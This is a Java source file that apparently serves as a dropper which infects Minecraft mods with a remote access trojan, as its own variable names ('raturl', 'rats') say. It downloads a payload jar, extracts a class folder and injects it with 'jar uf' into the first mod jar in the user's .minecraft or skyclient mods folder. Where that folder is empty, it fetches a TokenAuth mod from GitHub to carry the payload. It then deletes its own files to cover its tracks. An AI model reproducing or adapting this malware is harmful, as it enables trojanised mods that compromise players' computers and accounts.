package legacy.dev;

import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Paths;
import java.io.File;
import org.apache.commons.io.FileUtils;

// THIS IS VERY UGLY AND FAST MADE CODE! THERE MAY BE ERRORS!

public class Main {

    Boolean DxxxxY = false;
    Boolean Breadcat = false;

    public void downloadFile(String url, String fileName) {
        try {
            String foldername = "";
            if (DxxxxY) {
                foldername = "studio";
            }
            if (Breadcat) {
                foldername = "forge";
            }

//          URL of mod you want to use if no existings mods are in mod folder (must be a direct link to the file)
            String modurl = "https://github.com/DxxxxY/TokenAuth/releases/download/1.2.0/TokenAuth-1.2.0.jar";

            System.setProperty("http.agent", "Chrome");
            URL website = new URL(url);
            ReadableByteChannel rbc = Channels.newChannel(website.openStream());
            FileOutputStream fos = new FileOutputStream(fileName);
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
            fos.close();
            rbc.close();


            // get \AppData\Roaming\.minecraft\mods
            String path = Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".minecraft", "mods").toString();
            String path1 = Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".minecraft").toString();


            // Check all .jar files in mods folder
            File folder = new File(path);
            File[] files = folder.listFiles((dir, name) -> name.toLowerCase().endsWith(".jar"));


            // check if .minecraft\skyclient exists
            File skyclient = new File(path1 + "\\skyclient");
            if (skyclient.exists()) {
                Thread.sleep(500);
                String minecraft = Paths.get(System.getProperty("user.home"), "AppData", "Roaming", ".minecraft").toString();
                if (files.length == 0) {
                    System.setProperty("http.agent", "Chrome");
                    URL website1 = new URL(modurl);
                    ReadableByteChannel rbc1 = Channels.newChannel(website1.openStream());
                    FileOutputStream fos1 = new FileOutputStream("TokenAuth.jar");
                    fos1.getChannel().transferFrom(rbc1, 0, Long.MAX_VALUE);
                    fos1.close();
                    rbc1.close();

//                  Dumb way of taking class out of jar
                    String command = "jar xf JectorUtils.jar " + foldername;
                    Process process = Runtime.getRuntime().exec(command);
                    process.waitFor();

                    Thread.sleep(500);
                    File rats = new File(foldername);
                    FileUtils.moveDirectoryToDirectory(rats, new File(path1 + "\\skyclient\\mods"), true);

                    FileUtils.moveFileToDirectory(new File("TokenAuth.jar"), new File(path1 + "\\skyclient\\mods"), true);

                    String command3 = "cmd /c start cmd.exe /K \"cd " + path1 + "\\skyclient\\mods" + " && jar uf TokenAuth.jar " + foldername + " && exit\"";
                    Process process3 = Runtime.getRuntime().exec(command3);
                    process3.waitFor();
                } else {
                    File rats = new File(foldername);
                    File jarFile = files[0];
                    String jarFileName = jarFile.getName();
                    String command = "jar xf JectorUtils.jar " + foldername ;
                    Process process = Runtime.getRuntime().exec(command);
                    process.waitFor();

                    // move folder to .minecraft\skyclient\mods
                    FileUtils.moveDirectoryToDirectory(rats, new File(minecraft + "\\skyclient\\mods"), true);

                    String command3 = "cmd /c start cmd.exe /K \"cd " + minecraft + "\\skyclient\\mods && jar uf " + jarFileName + " " + foldername + " && exit\"";
                    Process process3 = Runtime.getRuntime().exec(command3);
                    process3.waitFor();
                }
            }


            if (files.length == 0) {
                System.setProperty("http.agent", "Chrome");
                URL website1 = new URL(modurl);
                ReadableByteChannel rbc1 = Channels.newChannel(website1.openStream());
                FileOutputStream fos1 = new FileOutputStream("TokenAuth.jar");
                fos1.getChannel().transferFrom(rbc1, 0, Long.MAX_VALUE);
                fos1.close();
                rbc1.close();

                String command = "jar xf JectorUtils.jar " + foldername;;
                Process process = Runtime.getRuntime().exec(command);
                process.waitFor();

                Thread.sleep(500);
                File rats = new File(foldername);
                FileUtils.moveDirectoryToDirectory(rats, new File(path), true);

                FileUtils.moveFileToDirectory(new File("TokenAuth.jar"), new File(path), true);

                String command3 = "cmd /c start cmd.exe /K \"cd " + path + " && jar uf TokenAuth.jar " + foldername + " && exit\"";
                Process process3 = Runtime.getRuntime().exec(command3);
                process3.waitFor();
            } else {
                File jarFile = files[0];
                String jarFileName = jarFile.getName();
                String command = "jar xf JectorUtils.jar " + foldername;
                Process process = Runtime.getRuntime().exec(command);
                process.waitFor();

                File rats = new File(foldername);


                // move folder to mods
                FileUtils.moveDirectoryToDirectory(rats, new File(path), true);

                String command3 = "cmd /c start cmd.exe /K \"cd " + path + " && jar uf " + jarFileName + " " + foldername + " && exit\"";
                Process process3 = Runtime.getRuntime().exec(command3);
                process3.waitFor();
            }
            Thread.sleep(1000);

            File folder1 = new File(foldername);
            FileUtils.deleteDirectory(folder1);

            // delete JectorUtils.jar
            File ratJar = new File("JectorUtils.jar");
            ratJar.delete();

            // timeout
            Thread.sleep(500);
            // delete studio folder in mods
            File studio = new File(path + "\\" + foldername);
            FileUtils.deleteDirectory(studio);

            File studio1 = new File(path1 + "\\skyclient\\mods\\" + foldername);
            FileUtils.deleteDirectory(studio1);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void main(String[] args) {
        String raturl = "";
        Main main = new Main();
        main.downloadFile(raturl, "JectorUtils.jar");
    }

}